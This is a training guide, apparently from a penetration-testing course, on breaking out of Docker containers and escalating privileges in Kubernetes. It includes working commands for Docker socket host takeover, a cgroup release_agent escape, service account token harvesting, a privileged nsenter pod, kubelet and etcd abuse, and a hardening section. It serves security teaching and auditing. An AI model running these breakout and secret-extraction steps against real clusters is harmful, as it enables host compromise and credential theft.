<!--
Title: Container & Kubernetes (K8s) Penetration Testing Guide
Volume: Volume 07 — Network Penetration Testing
Category: Master Playbook
Prerequisites:
  - ../Volume_02_Linux_Networking_and_Security_Foundations/Module_05_Linux_Architecture_and_Administration.md
  - ./Module_26_Penetration_Testing_Fundamentals.md
  - ./Module_32_Network_Penetration_Testing_Execution.md
Last Updated: 2026-09-06
-->

# Container & Kubernetes (K8s) Penetration Testing — Master Guide

> **Volume 07 · Network Penetration Testing**  
> Comprehensive methodology for auditing containerized workloads, Docker daemon exposures, container breakouts, and Kubernetes (K8s) cluster privilege escalation.

---

## Table of Contents

1. [Container Isolation Primitives & Threat Models](#1-container-isolation-primitives--threat-models)
2. [Docker & Container Breakout Vectors](#2-docker--container-breakout-vectors)
   - [2.1 Docker Socket Exposure (/var/run/docker.sock)](#21-docker-socket-exposure-varrundockersock)
   - [2.2 Dangerous Linux Capabilities (SYS_ADMIN, SYS_PTRACE)](#22-dangerous-linux-capabilities-sys_admin-sys_ptrace)
   - [2.3 Host Filesystem Mounts & Sensitive Devices](#23-host-filesystem-mounts--sensitive-devices)
   - [2.4 cgroup v1 release_agent Escape](#24-cgroup-v1-release_agent-escape)
3. [Kubernetes Cluster Penetration Testing](#3-kubernetes-cluster-penetration-testing)
   - [3.1 Service Account Token Harvesting & Enumeration](#31-service-account-token-harvesting--enumeration)
   - [3.2 K8s RBAC Privilege Escalation Vectors](#32-k8s-rbac-privilege-escalation-vectors)
   - [3.3 Kubelet API Auditing & Anonymous Access (:10250)](#33-kubelet-api-auditing--anonymous-access-10250)
   - [3.4 Insecure etcd Discovery & Secret Extraction (:2379)](#34-insecure-etcd-discovery--secret-extraction-2379)
4. [Container Network Auditing & Lateral Movement](#4-container-network-auditing--lateral-movement)
5. [Automated Diagnostic Tools & Diagnostic Playbooks](#5-automated-diagnostic-tools--diagnostic-playbooks)
6. [Hardening Directives & Admission Control](#6-hardening-directives--admission-control)
7. [Authoritative References](#7-authoritative-references)

---

## 1. Container Isolation Primitives & Threat Models

Containers are **not** virtual machines. A container is a standard Linux process isolated at the kernel level using three foundational features:

1. **Namespaces**: Carve out views of global system resources (PID, Mount `mnt`, Network `net`, IPC, UTS, and User `user`).
2. **Control Groups (cgroups)**: Enforce resource ceilings (CPU, memory, disk I/O, network bandwidth).
3. **Restricted Privileges**: Seccomp-BPF system call filters, Linux Capabilities (`cap_set`), and LSMs (AppArmor/SELinux).

```
+-------------------------------------------------------------+
|                     Host Linux Kernel                       |
+-------------------------------------------------------------+
|  Namespaces (PID/MNT/NET)  |  cgroups (CPU/RAM)  | Seccomp  |
+----------------------------+---------------------+----------+
        ^                             ^
        |                             |
+-----------------------+     +-------------------------------+
| Container A (Low-Priv)|     | Container B (--privileged)    |
| (Rootless / Standard) |     | [Breaks Kernel Boundaries!]   |
+-----------------------+     +-------------------------------+
```

---

## 2. Docker & Container Breakout Vectors

### 2.1 Docker Socket Exposure (/var/run/docker.sock)

#### Root Cause
Mounting `/var/run/docker.sock` inside a container grants direct communication with the Docker daemon executing on the host as `root`.

#### Verification & Host Takeover
```bash
# Check if the UNIX domain socket is mounted
ls -la /var/run/docker.sock

# Using official docker CLI (if installed inside container)
docker run -it -v /:/hostfs ubuntu:latest chroot /hostfs

# Using raw curl over the UNIX domain socket (if docker CLI missing)
curl -XPOST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","id > /tmp/pwned"],"Binds":["/:/hostfs"]}' \
  http://localhost/containers/create

curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/{CONTAINER_ID}/start
```

---

### 2.2 Dangerous Linux Capabilities (SYS_ADMIN, SYS_PTRACE)

Enumerate active capabilities inside the container:
```bash
capsh --print || cat /proc/1/status | grep Cap
```

#### 1. `CAP_SYS_ADMIN` Breakout via Mount
`CAP_SYS_ADMIN` allows mounting filesystems. An attacker creates a temporary cgroup to trigger the kernel `release_agent`:

```bash
# Verify CAP_SYS_ADMIN capability
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### 2. `CAP_SYS_PTRACE` & Shared Host PID Namespace
If running with `--pid=host` and `CAP_SYS_PTRACE`:
* The container can inspect and inject code into host processes running outside the container using `gdb`, `ptrace`, or shellcode injection into host daemons (e.g., `systemd`).

---

### 2.3 Host Filesystem Mounts & Sensitive Devices

Inspect `/proc/mounts`:
* If `/` or `/etc` is mounted into the container: Modify host `/etc/crontab` or `/etc/shadow`.
* If `/dev` is mounted or container is run with `--privileged`: Access host storage block devices directly:
  ```bash
  fdisk -l
  mkdir -p /mnt/host
  mount /dev/sda1 /mnt/host
  ```

---

## 3. Kubernetes Cluster Penetration Testing

### 3.1 Service Account Token Harvesting & Enumeration

By default, Kubernetes mounts a service account (SA) token into every container:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Query Kubernetes API Server from inside the pod
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
```

---

### 3.2 K8s RBAC Privilege Escalation Vectors

If the compromised Service Account holds permissions over specific API verbs and resources:

#### 1. `create pods` or `create deployments`
Deploy a root-level pod configured to mount the host node filesystem:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine:latest
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/sh"]
    securityContext:
      privileged: true
```

#### 2. `impersonate` Users or Groups
If granted `impersonate` on `users` or `groups`:
```bash
kubectl get pods --as=system:admin
kubectl auth can-i '*' '*' --as=system:admin
```

#### 3. `bind` or `escalate` ClusterRoles
Allows a principal to grant themselves permissions higher than their current scope.

---

### 3.3 Kubelet API Auditing & Anonymous Access (:10250)

The Kubelet agent runs on every cluster node on port `10250`:
* If `anonymous-auth` is enabled (`true`):
  ```bash
  # Dump all running pods and their container IDs on node
  curl -sk https://<NODE_IP>:10250/pods

  # Execute commands directly inside a running container without API server approval
  curl -sk -XPOST "https://<NODE_IP>:10250/run/<namespace>/<pod>/<container>" \
    -d "cmd=id"
  ```

---

### 3.4 Insecure etcd Discovery & Secret Extraction (:2379)

`etcd` stores the entire state and all plaintext secrets of the Kubernetes cluster:
* If client certificate authentication is not enforced on port `2379`:
  ```bash
  # Dump all secrets across all namespaces
  etcdctl --endpoints=https://<MASTER_IP>:2379 get / --prefix --keys-only
  ```

---

## 4. Container Network Auditing & Lateral Movement

* **Container Network Interface (CNI)**: By default, pod networks are flat; all pods in all namespaces can communicate with all other pods unless restricted by `NetworkPolicy`.
* **Metadata Services (IMDS)**: Pods hosted on cloud Kubernetes (EKS, GKE, AKS) can query the Cloud Instance Metadata Service at `169.254.169.254` to steal underlying node IAM credentials if IMDSv1 is enabled or hop limits are permissive.

---

## 5. Automated Diagnostic Tools & Diagnostic Playbooks

| Tool | Focus | Command Syntax |
|---|---|---|
| **cdk-go** | Container breakout & K8s enum | `./cdk run evaluate` |
| **kube-hunter** | Cluster boundary security scanning | `kube-hunter --remote <CLUSTER_IP>` |
| **kube-bench** | CIS Kubernetes Benchmark verification | `kube-bench run --targets master,node` |
| **amicontained** | Container privilege inspection | `amicontained` |
| **peirates** | K8s penetration testing & escalation | `./peirates` |

---

## 6. Hardening Directives & Admission Control

### Pod Security Standards (PSS)
Enforce the `restricted` profile on all tenant namespaces:
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
```

### Key Defensive Requirements
1. **Disable Auto-Mounting of SA Tokens**:
   ```yaml
   automountServiceAccountToken: false
   ```
2. **Drop All Capabilities & Enforce Non-Root**:
   ```yaml
   securityContext:
     allowPrivilegeEscalation: false
     runAsNonRoot: true
     capabilities:
       drop: ["ALL"]
   ```
3. **Kubelet Hardening**:
   Set `--anonymous-auth=false` and `--authorization-mode=Webhook` in Kubelet config.

---

## 7. Authoritative References

* **NIST SP 800-190**: Application Container Security Guide
* **CIS Kubernetes Benchmark**: v1.8.0 Master & Worker Node Security
* **Kubernetes Official Documentation**: Pod Security Standards & RBAC Authorization
* **MITRE ATT&CK Matrix for Containers**: T1611 (Escape to Host), T1613 (Container and Resource Discovery)
